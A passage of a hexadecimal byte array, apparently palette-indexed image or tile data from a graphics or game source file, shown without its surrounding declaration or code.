0x11, 0x11, 0x11, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xE0, 0xE1, 0xE2, 0xE0, 0xC8,
0xC8, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0xE2, 0x16, 0x19, 0x07, 0x1B, 0x1C, 0x1C, 0x1B,
0x19, 0x98, 0xDF, 0xDF, 0xDF, 0xDF, 0xC9, 0x14, 0x18, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x19, 0x19, 0x19, 0x18, 0x17, 0x9A, 0x08, 0x14, 0xE2, 0xE0, 0xC9, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE2, 0x14, 0x08, 0x16,
0x16, 0x9B, 0x16, 0x9A, 0x9A, 0x9A, 0x08, 0x13, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x13, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x14, 0xE3, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xE6, 0x14, 0xE6,
0xE7, 0xE7, 0xCE, 0xCE, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xCE, 0xCE, 0x13, 0xE3, 0xE2, 0x12,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xE0, 0xE2,
0xE1, 0xE0, 0xC9, 0xC8, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE2, 0x17, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x19, 0x99,
0xF6, 0xE0, 0xE0, 0xE0, 0xE0, 0xF7, 0x14, 0xE3, 0xE3, 0xE2, 0xE2, 0xF7, 0xF7, 0xF7, 0xE0, 0xE0,
0xDF, 0xDF, 0xDF, 0xDF, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCA, 0xE3, 0x14,
0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x14, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0xCA, 0xE3, 0x14, 0xE4, 0xE3, 0xE2, 0xE2, 0xE2, 0xE2, 0x13,
0x13, 0xCA, 0x13, 0x13, 0x13, 0x13, 0x13, 0xCA, 0xCA, 0xE6, 0xE3, 0xE5, 0xE5, 0xE3, 0xE3, 0xE3,
0xE5, 0xE5, 0xE5, 0x14, 0x14, 0xE5, 0xE6, 0xE7, 0xE7, 0xE8, 0xE8, 0xCF, 0xCF, 0xCF, 0xCF, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0xE6, 0x08,
0xA0, 0x9F, 0xA0, 0x08, 0x14, 0x14, 0xE5, 0xE6, 0xE7, 0xCE, 0xCE, 0xCE, 0xCE, 0xE6, 0xCA, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC9, 0xC8, 0xE0, 0x80, 0xE2, 0xE0, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x08, 0x17, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x19, 0x19, 0x18, 0x18, 0x17, 0x99, 0x14, 0xE1, 0xE0, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE1,
0xE3, 0xE3, 0xE3, 0xE4, 0x14, 0x14, 0xE3, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0x12, 0x12, 0x12,
0x12, 0xC9, 0xCA, 0x12, 0x12, 0x12, 0xCF, 0x12, 0x12, 0xCE, 0xE6, 0xE5, 0x14, 0xE4, 0xE6, 0xE5,
0xE4, 0x14, 0xE4, 0x14, 0xE6, 0xE7, 0xE8, 0xE7, 0xE6, 0xE5, 0xE5, 0xE7, 0xE8, 0xCF, 0xCF, 0xCF,
0xCF, 0xCF, 0xE8, 0xE6, 0x88, 0x14, 0x88, 0xE6, 0x88, 0x88, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE6,
0x88, 0x14, 0x14, 0xE6, 0x88, 0x14, 0xA0, 0xA0, 0xA0, 0x08, 0x14, 0xE6, 0xCF, 0x12, 0x12, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0x80, 0x80, 0xE2, 0x80, 0xE0, 0xC8, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0xC9, 0xE1, 0xE2, 0xE2, 0xF6,
0xE2, 0xE1, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE1,
0xE3, 0x08, 0x08, 0x08, 0x08, 0xE4, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xCA,
0xCA, 0x13, 0x13, 0x13, 0xCA, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xCF, 0x12, 0x12, 0x12, 0xCF, 0x12, 0xCF, 0xE6, 0xE6,
0xE6, 0xE7, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCE, 0xE7, 0xE8, 0xD1, 0xD0, 0xD0,
0xD0, 0xD0, 0xD1, 0xE8, 0xEA, 0xE9, 0xE8, 0xE8, 0xE8, 0xEA, 0xD1, 0xD0, 0xD0, 0xD0, 0xD1, 0xD1,
0xD1, 0xD1, 0xE8, 0xE8, 0xE8, 0xE8, 0xE9, 0xE9, 0xEA, 0xE7, 0xE7, 0xE6, 0xE6, 0xE7, 0xE8, 0xD0,
0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE8, 0x12,
0x12, 0x12, 0x12, 0x7F, 0x7F, 0x7F, 0x7F, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xC8, 0xE0, 0xC9, 0x80, 0x98, 0x80, 0xE0, 0xC8, 0xC8, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0x12,
0x12, 0xC9, 0xE1, 0xE2, 0xE2, 0x13, 0xCA, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xCA, 0xCA, 0xCA, 0xCA,
0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0xCA, 0x13, 0x13,
0x13, 0x13, 0xCA, 0xCA, 0xCE, 0xCE, 0xCE, 0xCE, 0xCE, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13,
0x13, 0xCE, 0x13, 0xCE, 0xCE, 0xE5, 0x14, 0x14, 0xE6, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xCF, 0xE8,
0xE8, 0xE9, 0xEA, 0xE9, 0xD1, 0xD1, 0x88, 0x87, 0x88, 0xE7, 0xE6, 0x88, 0xE8, 0xD1, 0xD1, 0xD0,
0xD1, 0xE8, 0xE9, 0xE9, 0xE8, 0xE8, 0xD1, 0xD0, 0xD0, 0xD0, 0xD0, 0xD1, 0xE8, 0xEA, 0x14, 0x14,
0x14, 0x08, 0x08, 0x14, 0x14, 0xE9, 0xD1, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x13, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x7F, 0x69, 0x69, 0x69, 0x69, 0x69, 0x69,
0xC8, 0xC8, 0xC8, 0xC9, 0xC8, 0xC9, 0xE0, 0x80, 0x80, 0x80, 0xE2, 0xE1, 0xC9, 0xC8, 0x12, 0x12,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x12, 0x12, 0xC9, 0xE1, 0xC9, 0x12,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0x13, 0x14, 0xE4, 0xE2, 0xE2, 0xE2, 0xE3, 0xE3,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3,
0xE3, 0xE2, 0x13, 0x13, 0x13, 0xE6, 0xE6, 0xE6, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE5, 0xE6, 0xE6, 0xE6, 0xE5, 0xE5, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE7, 0xE7, 0xE7,
0xE7, 0xE7, 0xE7, 0xE8, 0xE8, 0xE8, 0x88, 0xA0, 0xA0, 0x88, 0x89, 0xA0, 0x89, 0xE9, 0xE8, 0xE7,
0xE9, 0xE8, 0xD1, 0xE8, 0x88, 0x88, 0xEA, 0xE8, 0xD1, 0xD0, 0xD1, 0xE8, 0xD0, 0xD1, 0xEB, 0x14,
0x14, 0xE5, 0xE8, 0xE8, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE5, 0xE6, 0xE8, 0x12, 0x12,
0x12, 0x12, 0xE5, 0xC7, 0xC7, 0xC7, 0xC7, 0xC7, 0xC7, 0x7F, 0x7F, 0x7F, 0x7F, 0x69, 0x69, 0x69,
0xC8, 0xC8, 0x80, 0x80, 0xC9, 0xC9, 0xC9, 0xC9, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xE0, 0x14, 0x14,
0x14, 0xE2, 0xC9, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0xC9, 0xE2, 0x99, 0x16,
0x14, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xE3, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0x14,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE5, 0xE5, 0xE5, 0xE6, 0xE6, 0xE6, 0xE6, 0xE5, 0xE6, 0xE8, 0xE8, 0xCF, 0xD0, 0xD0, 0xCF, 0xD1,
0xCF, 0xE8, 0xE8, 0xD0, 0xD0, 0xD0, 0xD1, 0xD0, 0xD0, 0xD0, 0xD0, 0xD1, 0xE8, 0xCF, 0xD0, 0xD0,
0xE8, 0xE6, 0xE6, 0xE5, 0xE6, 0x14, 0x14, 0x14, 0xE7, 0xE6, 0x14, 0x08, 0x9F, 0x9F, 0x9F, 0x9F,
0x08, 0x08, 0x9E, 0x81, 0x80, 0x80, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8,
0xC8, 0xDF, 0x80, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xB1, 0xB1, 0xB1, 0x11, 0x11, 0x11, 0xE1, 0x14,
0x08, 0x14, 0xE0, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE1, 0xE1, 0xE2, 0x14,
0x16, 0x17, 0x16, 0x16, 0x08, 0x08, 0x14, 0xE3, 0xE3, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0xE4, 0xE6, 0xE7, 0xE7, 0xE7, 0xE7,
0xE7, 0xCF, 0xE7, 0xE7, 0xE7, 0xE6, 0xE6, 0xE8, 0xE6, 0xE6, 0xE6, 0xE8, 0xCF, 0xE7, 0xE5, 0x14,
0xE5, 0xCE, 0xCF, 0xCF, 0xCF, 0xE6, 0x14, 0x9F, 0x9E, 0x9F, 0x16, 0x9E, 0x08, 0x14, 0x14, 0x08,
0x08, 0x9E, 0x9D, 0x19, 0x19, 0x18, 0x18, 0x18, 0x17, 0x16, 0xAF, 0x98, 0x81, 0x81, 0x81, 0x97,
0x97, 0x81, 0x97, 0x80, 0x80, 0x80, 0x80, 0xC9, 0xC8, 0xB1, 0xB1, 0x11, 0x11, 0x12, 0xC9, 0x14,
0x14, 0xE0, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE1, 0xE2, 0xE2, 0xE1, 0xE1,
0x14, 0x16, 0x18, 0x18, 0x17, 0x16, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x9E, 0x16, 0x9E, 0x08, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE5,
